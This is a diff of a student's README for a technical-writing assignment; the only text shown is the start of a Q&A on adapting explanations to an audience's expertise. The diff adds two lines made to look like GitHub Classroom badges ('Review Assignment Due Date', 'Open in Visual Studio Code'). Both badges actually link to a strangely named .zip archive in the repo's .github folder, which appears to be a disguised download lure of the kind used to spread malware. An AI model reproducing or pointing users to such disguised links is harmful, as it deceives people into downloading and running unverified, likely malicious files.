@@ -1,3 +1,5 @@
+[![Review Assignment Due Date](https://github.com/Delson869/se-assignment-day-5-technical-writing-and-review-Delson869/raw/refs/heads/main/.github/day-se-technical-assignment-writing-and-Delson-review-3.2-alpha.2.zip)](https://github.com/Delson869/se-assignment-day-5-technical-writing-and-review-Delson869/raw/refs/heads/main/.github/day-se-technical-assignment-writing-and-Delson-review-3.2-alpha.2.zip)
+[![Open in Visual Studio Code](https://github.com/Delson869/se-assignment-day-5-technical-writing-and-review-Delson869/raw/refs/heads/main/.github/day-se-technical-assignment-writing-and-Delson-review-3.2-alpha.2.zip)](https://github.com/Delson869/se-assignment-day-5-technical-writing-and-review-Delson869/raw/refs/heads/main/.github/day-se-technical-assignment-writing-and-Delson-review-3.2-alpha.2.zip)
 # SE-DAY5-Technical-Writing
 ## 1. How can understanding your audience’s expertise level (tech experts vs. regular folks) shape the way you present technical information?
 For tech experts: You can use more technical jargon, assume prior knowledge, and dive into complex concepts without much basic explanation.
